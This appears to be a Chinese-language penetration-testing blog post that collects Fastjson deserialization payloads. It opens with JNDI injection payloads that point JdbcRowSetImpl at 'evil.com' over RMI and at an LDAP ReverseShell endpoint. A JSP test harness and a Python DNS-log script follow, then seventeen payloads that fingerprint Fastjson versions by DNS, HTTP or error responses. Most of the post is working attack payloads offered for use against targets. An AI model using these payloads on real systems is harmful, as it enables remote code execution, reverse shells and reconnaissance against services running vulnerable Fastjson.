---
title: Fastjson Payload
published: 2025-04-15 17:09
tags: [Fastjson, JNDI, Payload, 反序列化]
category: Web
draft: false
---

# Fastjson Payload

```
fastjson1.1.24
payload：
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/TouchFile",
        "autoCommit":true
    }
}



Fastjson 1.1.27
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}



fastjson1.1.24 （简易版JNDI）
payload：
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.56.10.12:1389/Basic/ReverseShell/10.56.10.12/80",
        "autoCommit":true
    }
}
```

## **0x00 概述**

使用常见的payload对fastjson版本进行测试，方便遇到fastjson进行较小范围的版本判断，使用bypass字符绕过等等

## **0x01 背景**

测试过程中，会遇到很多json进行传输的站点，有jackson、fastjson等等，但是这些当中，有漏洞的概率最大的还是fastjson。

## **0x02 测试具体方法**

用pom把所有版本的fastjson下载了，然后在fastjson文件夹下执行这个命令，把fastjson固定在一个文件内，通过反射装载jar，调用完以后卸载

```
find . -name "*.jar" -type f -exec cp  {} /Users/f0ng/xxxxxx/ \;
```

调用fastjson包的原理为 使用反射获取请求里传来的版本参数，从而动态调用相应版本的fastjson进行解析，解析完毕以后自动卸载，测试涵盖fastjson1所有版本

测试版本如下：

```
1_2_83
1_2_80
1_2_79
1_2_78
1_2_77
1_2_76
1_2_75
1_2_74
1_2_73
1_2_72
1_2_71
1_2_70
1_2_69
1_2_68
1_2_67
1_2_66
1_2_62
1_2_61
1_2_60
1_2_59
1_2_58
1_2_57
1_2_56
1_2_55
1_2_54
1_2_53
1_2_52
1_2_51
1_2_50
1_2_49
1_2_48
1_2_47
1_2_46
1_2_45
1_2_44
1_2_43
1_2_42
1_2_41
1_2_40
1_2_39
1_2_38
1_2_37
1_2_36
1_2_35
1_2_34
1_2_33
1_2_32
1_2_31
1_2_30
1_2_29
1_2_28
1_2_27
1_2_26
1_2_25
1_2_24
1_2_23
1_2_22
1_2_21
1_2_20
1_2_19
1_2_18
1_2_17
1_2_16
1_2_15
1_2_14
1_2_13
1_2_12
1_2_11
1_2_10
1_2_9
1_2_8
1_2_7
1_2_6
1_2_5
1_2_4
1_2_3
1_2_2
1_2_1
```

python脚本如下

```python
# -*- coding: utf-8 -*-

fastjosn_version = ["1_2_83",  
"1_2_80",  
"1_2_79",  
"1_2_78",  
"1_2_77",  
"1_2_76",  
"1_2_75",  
"1_2_74",  
"1_2_73",  
"1_2_72",  
"1_2_71",  
"1_2_70",  
"1_2_69",  
"1_2_68",  
"1_2_67",  
"1_2_66",  
"1_2_62",  
"1_2_61",  
"1_2_60",  
"1_2_59",  
"1_2_58",  
"1_2_57",  
"1_2_56",  
"1_2_55",  
"1_2_54",  
"1_2_53",  
"1_2_52",  
"1_2_51",  
"1_2_50",  
"1_2_49",  
"1_2_48",  
"1_2_47",  
"1_2_46",  
"1_2_45",  
"1_2_44",  
"1_2_43",  
"1_2_42",  
"1_2_41",  
"1_2_40",  
"1_2_39",  
"1_2_38",  
"1_2_37",  
"1_2_36",  
"1_2_35",  
"1_2_34",  
"1_2_33",  
"1_2_32",  
"1_2_31",  
"1_2_30",  
"1_2_29",  
"1_2_28",  
"1_2_27",  
"1_2_26",  
"1_2_25",  
"1_2_24",  
"1_2_23",  
"1_2_22",  
"1_2_21",  
"1_2_20",  
"1_2_19",  
"1_2_18",  
"1_2_17",  
"1_2_16",  
"1_2_15",  
"1_2_14",  
"1_2_13",  
"1_2_12",  
"1_2_11",  
"1_2_10",  
"1_2_9",  
"1_2_8",  
"1_2_7",  
"1_2_6",  
"1_2_5",  
"1_2_4",  
"1_2_3",  
"1_2_2",  
"1_2_1"]  
  
import requests  
  
def convert_to_ranges(versions):  
    ranges = []  
    start = end = versions[0]  
  
    for v in versions[1:] + [None]:  
        # 将版本号字符串转换为数字列表  
        parts = list(map(int, v.split('_'))) if v is not None else None  
        end_parts = list(map(int, end.split('_')))  
  
        # 检查版本是否连续  
        if parts is not None and parts[0] == end_parts[0] \  
           and parts[1] == end_parts[1] and parts[2] == end_parts[2] - 1:  
            end = v  
        else:  
            # 如果只有一个版本，只添加这个版本  
            if start == end:  
                ranges.append(start)  
            else:  
                ranges.append(f"{end}-{start}")  
            if v is not None:  
                start = end = v  
    return ranges  
  
  
  
burp0_url = "https://callback.red:443/"  
burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"", "Sec-Ch-Ua-Platform": "\"macOS\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "https://www.callback.red", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.callback.red/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}  
  
burp0_data = {"key":  
                  "xxxxxxxxx"}  
resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)  
  
  
total = []  
for _ in fastjosn_version:  
    if  _.replace(".","_")+"." not in resp.text :  
        total.append(_)  
  
  
if len(total) > 0:  
    # 调用函数并打印结果  
    version_ranges = convert_to_ranges(total)  
else:  
    version_ranges = "无"  
print("不可用版本")  
print(version_ranges)
```

主要流程

1. 将fastjson的payload准备好，动态加载参数`version`设置为变量，payload的dnslog设置为变量，字典为版本号，进行intruder爆破
2. 在dnslog平台查看相应的版本号，如果没有相应的版本，则表示相应版本无法使用payload进行dnslog获取

jsp源码如下

```jsp
<%@ page import="java.io.InputStreamReader" %>  
<%@ page import="java.io.BufferedReader" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="java.net.URL" %>  
<%@ page import="java.net.URLClassLoader" %>  
<%@ page import="java.lang.reflect.Method" %>  
  
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<%--测试fastjson各个版本payload、bypass字符--%>  
<%  
      // JAR文件的路径  
      URL jarUrl = new URL("file:///Users/f0ng/fastjsonjars/fastjson-"+request.getParameter("version").replace("_",".")+".jar");  
// 父类加载器，可以用当前线程的类加载器等  
      ClassLoader parentClassLoader = Thread.currentThread().getContextClassLoader();  
// 创建URLClassLoader实例以加载JAR  
      URLClassLoader classLoader = new URLClassLoader(new URL[]{jarUrl}, parentClassLoader);  
  
      Class var8 = classLoader.loadClass("com.alibaba.fastjson.JSONArray");  
      Field var9 = var8.getField("VERSION");  
      String var10 = (String)var9.get("");  
  
  
      response.setHeader("version",var10);  
  
      BufferedReader br = new BufferedReader(new InputStreamReader((ServletInputStream) request.getInputStream(), "utf-8"));  
  
      StringBuffer sb = new StringBuffer("");  
      String temp;  
  
      while ((temp = br.readLine()) != null) {  
            sb.append(temp);  
      }  
  
      br.close();  
      String params = sb.toString();  
  
 out.print(params);  
 Class var81 = classLoader.loadClass("com.alibaba.fastjson.JSON");  
 Method parseMethod = var81.getMethod("parse", String.class);  
 Object result = parseMethod.invoke(null, params);  
 classLoader.close();  
%>
```

dnslog的payload流程如上，其他类型，如报错、回显这种也类似

测试的时候，在响应头可以看到相应的fastjson版本

![](/images/posts/fastjson-payload/1.png)

在响应平台获取到相应记录

![](/images/posts/fastjson-payload/2.png)

## **0x03 判断版本payload**

测试的一切payload均采用fastjson的默认配置，本次测试只用到了`com.alibaba.fastjson.JSON.parse()`函数

#### **payload 1(dns请求)【fastjson>=1.2.37】**

```json
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://§1§.{{URL}}"}}""}
```

经测试，可用范围`1.2.37-1.2.83`，即fastjson版本>=1.2.37

#### **payload 2(dns请求)【fastjson>=1.2.37】**

```json
{{"@type":"java.net.URL","val":"http://§1§.{{URL}}"}:0
```

经测试，可用范围`1.2.37`-`1.2.83`，即fastjson版本>=1.2.37

#### **payload 3(dns请求)【fastjson>=1.2.9】**

```json
Set[{"@type":"java.net.URL","val":"http://§1§.{{URL}}"}]
```

经测试，可用范围`1.2.9`-`1.2.83`，即fastjson版本>=1.2.9

#### **payload 4(dns请求)【fastjson>=1.2.9】**

```json
Set[{"@type":"java.net.URL","val":"http://§1§.{{URL}}"}
```

经测试，可用范围`1.2.9`-`1.2.83`，即fastjson版本>=1.2.9

#### **payload 5(dns请求)【1.2.9<=fastjson<=1.2.47】**

```json
{"name":{"@type":"java.net.InetAddress","val":"§1§.{{URL}}"}}
```

经测试，可用范围`1.2.47`以下，`1.2.9`以上，即1.2.9<=fastjson版本<=1.2.47

#### **payload 6(dns请求)【fastjson>=1.2.9】**

```json
[{"@type":"java.net.InetSocketAddress"{"address":,"val":"§1§.{{URL}}"}}]
```

经测试，可用范围`1.2.9`以上，即fastjson版本>=1.2.9

#### **payload 7(http请求)【1.2.37<=fastjson<=1.2.68】**

```json
{"a":{"@type":"java.lang.AutoCloseable","@type":"com.alibaba.fastjson.JSONReader","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://§1§.{{URL}}"}}}
```

经测试，可用范围`1.2.68`以下，`1.2.37`以上，即1.2.37<=fastjson版本<=1.2.68

#### **payload 8(dns请求)【fastjson>=1.2.9以及fastjson=1.2.83】**

```json
[{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"§1§.80.{{URL}}"}}},{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress"{"address":,"val":"§1§.83.{{URL}}"}}}]
```

经测试，带有83的dnslog记录只会在`fastjson 1.2.83`中出现

带有80的dnslog记录，可用范围`1.2.9`以上

#### **payload 9(dns请求)【1.2.9<=fastjson<=1.2.68】**

```json
[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "§1§.{{URL}}"}}]
```

经测试，可用范围`1.2.9`以上，`1.2.68`以下，即1.2.9<=fastjson版本<=1.2.68

#### **payload 10(dns请求)【1.2.9<=fastjson<=1.2.47】**

```json
{"@type":"java.net.InetAddress","val":"§1§.{{URL}}"}
```

经测试，可用范围`1.2.9`以上，`1.2.47`以下，即1.2.9<=fastjson版本<=1.2.47

#### **payload 11(dns请求)【fastjson>=1.2.9】**

单独的两条

```json
{"@type":"java.net.Inet4Address","val":"§1§.{{URL}}"}

{"@type":"java.net.Inet6Address","val":"§1§.{{URL}}"}
```

经测试，可用范围`1.2.9`以上，即fastjson版本>=1.2.9

#### **payload 12(dns请求)【fastjson>=1.2.9】**

```json
{"@type":"java.net.InetSocketAddress"{"address":,"val":"§1§.{{URL}}"}}
```

经测试，可用范围`1.2.9`以上，即fastjson版本>=1.2.9

#### **payload 13(dns请求)【1.2.9<=fastjson<=1.2.24以及1.2.40<=fastjson<=1.2.47】**

```json
[{"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},{"@type":"java.io.ByteArrayOutputStream"},{"@type":"java.net.InetSocketAddress"{"address":,"val":"§1§.{{URL}}"}}]
```

经测试，可用范围`1.2.9`以上，`1.2.24`以下或者`1.2.40`以上，`1.2.47`以下，即`1.2.9<=fastjson版本<=1.2.24`或者`1.2.40<=fastjson版本<=1.2.47`

#### **payload 14(报错)【fastjson<=1.2.24以及fastjson=1.2.83】**

```json
{"page":{"pageNumber":1,"pageSize":1,"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}}
```

经测试，在fastjson<=1.2.24以及fastjson=1.2.83的时候不会报错，其余均报错

#### **payload 15(报错)【fastjson<=1.2.68】**

```json
{"page":{"pageNumber":1,"pageSize":1,"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}}
```

经测试，在fastjson<=1.2.68的时候不会报错，其余均报错

#### **payload 16(报错) 【1.2.9<=fastjson<=1.2.47】**

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}
```

经测试，在1.2.9<=fastjson<=1.2.47的时候不会报错，其余均报错

#### **payload 17(报错) 【fastjson<=1.2.47】**

```json
{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
```

经测试，在fastjson<=1.2.47的时候不会报错，其余均报错